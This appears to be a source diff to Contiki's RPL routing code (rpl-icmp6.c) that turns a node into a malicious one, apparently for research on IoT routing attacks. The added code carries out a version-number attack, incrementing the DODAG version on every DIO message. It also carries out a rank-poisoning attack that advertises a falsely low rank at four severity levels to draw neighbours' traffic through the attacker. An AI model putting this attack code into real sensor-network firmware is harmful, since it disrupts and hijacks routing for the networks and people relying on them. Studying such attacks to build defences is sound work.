@@ -37,13 +37,14 @@
  * \author Joakim Eriksson <joakime@sics.se>, Nicolas Tsiftes <nvt@sics.se>
  * Contributors: Niclas Finne <nfi@sics.se>, Joel Hoglund <joel@sics.se>,
  *               Mathieu Pouillot <m.pouillot@watteco.com>
- *               George Oikonomou <oikonomou@users.sourceforge.net> (multicast)
+ *               Georg Oikonomou <oikonomou@users.sourceforge.net> (multicast)
  */
 
 /**
  * \addtogroup uip6
  * @{
  */
+
 #include "net/ip/tcpip.h"
 #include "net/ip/uip.h"
 #include "net/ipv6/uip-ds6.h"
@@ -73,6 +74,16 @@
   uip_ipaddr_t *dao_preffered_parent_ip;
   uip_ipaddr_t dao_prefix_own_ip;
   uint8_t dao_parent_set;
+
+/* NEEDED ONLY for poisoning the rank of the attacker node, to implement
+ * rank attack ONLY.
+ */  
+static int PARENT_SWITCH_THRESHOLD = 96;
+
+/* NEEDED ONLY for poisoning the rank of the attacker node, to implement
+ * rank attack ONLY.
+ */  
+//static int PARENT_SWITCH_THRESHOLD = 96;
 
 /*---------------------------------------------------------------------------*/
 #define RPL_DIO_GROUNDED                 0x80
@@ -501,7 +512,21 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
 
   buffer = UIP_ICMP_PAYLOAD;
   buffer[pos++] = instance->instance_id;
-  buffer[pos++] = dag->version;
+
+/* George ****************** VERSION ATTACK ******************************/  
+/* DON'T FORGET THAT OTHER ATTACKS (e.g., DODAG Inconsistensy should be 
+* off (commented out) in file rpl-ext.header.c
+*/ 
+ 
+   //buffer[pos++] = dag->version; // ORIGINAL LINE
+   
+  // Version number attack: Increasing dag->version
+  buffer[pos++] = ++ (dag->version); // George version number of whom? Mine or child?
+
+#if PRINT_VERSION_INCREASE
+  printf("Version number increased: ++ (dag->version)\n");
+#endif
+ 
   is_root = (dag->rank == ROOT_RANK(instance));
 
 #if RPL_LEAF_ONLY
@@ -509,7 +534,54 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
   printf("RPL: LEAF ONLY DIO rank set to INFINITE_RANK\n");
   set16(buffer, pos, INFINITE_RANK);
 #else /* RPL_LEAF_ONLY */
-  set16(buffer, pos, dag->rank);
+
+/******************** POISONING DIOs *****************************/
+  /* George Poisoining the DIO sent to neighbors:
+   * The rank of the malicious node is fakely advertised as lower.
+   * it can be three different levels: light, adequate, severe.
+   * In all cases, if the malicious is closer to the sink, the rank
+   * will be slightly above the sink's rank (So RPL will root 
+   * normally from nodes via the malicious to the sink.
+   * Sink's rank is usually 128, PARENT_SWITCH_THRESHOLD is 96 or 160.
+   * A node's rank should not be lesser than the sink, hence it should 
+   * be more than 128. 
+   * Choose wisely....
+   */
+   int fake_rank; 
+   switch(MALICIOUS_LEVEL){ 
+	  case 4:
+		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
+		 	 2*PARENT_SWITCH_THRESHOLD ?
+			 dag->rank - 8*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
+	  	 break;
+	  case 3:
+		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
+		 	 2*PARENT_SWITCH_THRESHOLD ?
+			 dag->rank - 6*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
+	  	 break;
+	  case 2:
+		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 
+		 	 2*PARENT_SWITCH_THRESHOLD ?
+			 dag->rank - 4*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
+	    break;
+	  case 1:
+		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD >
+		 	 2*PARENT_SWITCH_THRESHOLD ?
+			 dag->rank - 2*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
+	    break; 
+	  default: // All other number
+ 	  		PRINTF("No MALICIOUS_LEVEL set, NORMAL dag->rank\n");
+ 	  		fake_rank = dag->rank;
+  }
+  PRINTF("PARENT_SWITCH_THRESHOLD:%d, dag->rank:%d, fake:%d\n",
+  			PARENT_SWITCH_THRESHOLD, dag->rank,fake_rank);
+  PRINTF("MALICIOUS_LEVEL %d\n", MALICIOUS_LEVEL);
+
+  set16(buffer, pos, fake_rank);
+  //set16(buffer, pos, dag->rank);
+  
+/************************************************************************/  
+  
 #endif /* RPL_LEAF_ONLY */
   pos += 2;
 
@@ -1053,6 +1125,16 @@ handle_dao_retransmission(void *ptr)
 
   parent = ptr;
   if(parent == NULL || parent->dag == NULL || parent->dag->instance == NULL) {
+  
+  	 
+  	 // George no parent yet, hence dont sent anything to the controller
+  	 /* "Normal node" behavior: answering promptly to controller's requests */
+  	 PRINTF("RPL: No parent set yet\n");
+  	 dao_parent_set = 0;
+  
+  
+  
+  
     return;
   }
   instance = parent->dag->instance;
@@ -1110,34 +1192,9 @@ dao_output(rpl_parent_t *parent, uint8_t lifetime)
   }
 
   if(parent == NULL || parent->dag == NULL || parent->dag->instance == NULL) {
-  	 
-  	 // George no parent yet, hence dont sent anything to the controller
-  	 PRINTF("RPL: No parent set yet\n");
-  	 dao_parent_set = 0;
-  	   	 
     return;
-  } 
-  
-  
-  
-  
-  /* 2020-10-10 the below, for networks > 25 nodes returns a "crazy" IP 
-   * for at least one node [00a0:....:0000] which is not to be found 
-  
-  
-  // 2020-10-10 moved inside dao_output_target_seq. Looks better???
-  
-  else { // George All these lines added for sending the parent to the controller
-		  // George they will be external to app layer for extra info to the sink
-		dao_preffered_parent = parent;
-		dao_preffered_parent_ip = rpl_get_parent_ipaddr(dao_preffered_parent->dag->preferred_parent);
-		dao_prefix_own_ip = prefix; //node's current own IP address
-		dao_parent_set = 1; //now the parent can be used further
   }
-  */
-  
-  
-  
+
   RPL_LOLLIPOP_INCREMENT(dao_sequence);
 #if RPL_WITH_DAO_ACK
   /* set up the state since this will be the first transmission of DAO */
@@ -1157,6 +1214,19 @@ dao_output(rpl_parent_t *parent, uint8_t lifetime)
      that we have a down-link - unless this is a zero lifetime one */
   parent->dag->instance->has_downward_route = lifetime != RPL_ZERO_LIFETIME;
 #endif /* RPL_WITH_DAO_ACK */
+
+
+
+
+/* George they will be external to app layer for extra info to the sink*/ 
+dao_preffered_parent = parent;
+dao_preffered_parent_ip = rpl_get_parent_ipaddr(dao_preffered_parent->dag->preferred_parent);
+dao_prefix_own_ip = prefix; //node's current own IP address
+
+
+
+
+
 
   /* Sending a DAO with own prefix as target */
   dao_output_target(parent, &prefix, lifetime);
@@ -1221,9 +1291,8 @@ dao_output_target_seq(rpl_parent_t *parent, uip_ipaddr_t *prefix,
 
 
 
-
-
-
+	/* "Normal node behavior: Will communicate the node's parent to the controller */
+	
 
 	// George they will be external to app layer for extra info to the sink
 	dao_preffered_parent = parent;
@@ -1236,12 +1305,6 @@ dao_output_target_seq(rpl_parent_t *parent, uip_ipaddr_t *prefix,
 	//printf("my rpl-icmp6.c parent: ");
 	//printLongAddr(parent_ipaddr);
 	//printf("\n");
-
-
-
-
-
-
 
 
 
